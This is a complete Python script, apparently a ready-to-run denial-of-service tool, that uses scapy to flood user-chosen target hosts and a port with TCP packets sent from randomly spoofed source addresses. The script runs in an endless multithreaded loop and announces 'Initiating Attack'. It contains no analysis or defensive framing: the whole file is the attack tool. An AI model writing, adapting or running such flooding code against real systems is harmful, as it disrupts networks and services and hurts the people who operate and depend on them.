#!/usr/bin/env python

from scapy.all import *
import threading
import random
import time
import sys 

def RandomHost():
    #
    octetOne = str(random.randint(10,255))
    #
    octetTwo = str(random.randint(10,255))
    #
    octetThree = str(random.randint(10,255))
    #
    octetFour = str(random.randint(10,255))
    #
    host = octetOne+'.'+octetTwo+'.'+octetThree+'.'+octetFour
    #
    return host

def PopulateHosts(hosts):
    #
    sentinel = input("[+] Enter the host IP Address-> ")
    #
    hosts.append(sentinel)
    #
    print("[*] Continue entering address or press (N/n) to return")
    #
    while(sentinel is not 'n' and sentinel is not 'N'):
        #
        sentinel = input("[+] Enter the host IP Address-> ")
        #
        if(sentinel is not 'n' and sentinel is not 'N'):
            #
            hosts.append(sentinel)
            #
        if(sentinel is 'n' or sentinel is 'N'):
            #
            return hosts


def attack(target,port):
    #
    host = RandomHost() ; sourcePort = random.randint(1,65535)
    #
    ip = IP(src=host,dst=target)
    #
    tcp = TCP(sport=sourcePort,dport=port)
    #
    pkt = ip/tcp
    #
    print("[*] %s:%i >>> sent packet to >>> %s:%i " % (host,sourcePort,target,port))
    #
    send(pkt,inter=.001,verbose=False)
    #
    return

def main():
    #
    print("""
 **************************************
 *  ____             _       _        *
 * |  _ \  ___ _ __ (_) __ _| |       *
 * | | | |/ _ \ '_ \| |/ _` | |       *
 * | |_| |  __/ | | | | (_| | |       *
 * |____/ \___|_| |_|_|\__,_|_|       *
 *            ___  / _|               *
 *           / _ \| |_                *
 *  __ __    |(_) |  _|   _           *
 * / ___|  __\___/|_|   _(_) ___ ___  *
 * \___ \ / _ \ '__\ \ / / |/ __/ _ \ *
 *  ___) |  __/ |   \ V /| | (_|  __/ *
 * |____/ \___|_|    \_/ |_|\___\___| *
 **************************************
 * Multiple Host  Single Port Edition *
 **************************************                                                                                
          """)
    #
    time.sleep(1)
    #
    targets = []
    #
    targets = PopulateHosts(targets)
    #
    port = int(input("[+] Enter the target port-> "))
    #
    print("[*] Target(s) set to: %s:%i " % (targets,port))
    #
    print("""
*************************
*** Initiating Attack ***
*************************
    """)
    #
    threads = []
    #
    while(True):
        #
        for i in range(0,10):
            #
            for tgt in targets:
                #
                t = threading.Thread(target=attack,args=(tgt,port))
                #
                threads.append(t)
                #
                t.start()
                #
                for t in threads:
                    #
                    t.join()

if(__name__ == '__main__'):
    #
    main()